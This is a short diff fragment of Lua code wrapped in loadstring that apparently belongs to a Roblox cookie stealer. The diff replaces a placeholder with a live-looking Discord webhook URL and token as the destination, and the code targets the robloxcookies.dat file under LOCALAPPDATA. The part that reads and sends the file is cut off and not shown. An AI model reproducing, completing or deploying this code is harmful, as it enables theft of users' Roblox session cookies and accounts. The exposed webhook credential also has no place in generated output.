@@ -1,5 +1,5 @@
 loadstring([[
-local WEBHOOK = "TU_WEBHOOK_AQUI"
+local WEBHOOK = "https://discord.com/api/webhooks/1574916444737503366/oVzDIU9pqdV20Azuik5b6nMWsL6A9yO7Id4f_wb_45jLZT9FEbISvvDhCUH1dKHjyKNR"
 
 local paths = {
     os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\robloxcookies.dat",
